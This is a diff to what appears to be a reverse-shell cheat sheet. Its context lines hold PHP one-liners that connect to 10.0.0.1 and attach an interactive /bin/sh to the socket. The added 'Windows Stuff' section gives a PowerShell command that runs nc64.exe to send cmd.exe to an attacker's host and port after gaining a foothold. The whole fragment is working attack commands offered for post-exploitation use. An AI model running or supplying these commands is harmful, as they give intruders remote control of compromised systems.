@@ -1861,3 +1861,8 @@ php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
+### Windows Stuff
+
+What to do - I have a foothold how do I get a reverse shell?
+
+- `powershell -c cd C:\Users\myuser\Downloads; .\nc64.exe -e cmd.exe myip myport`
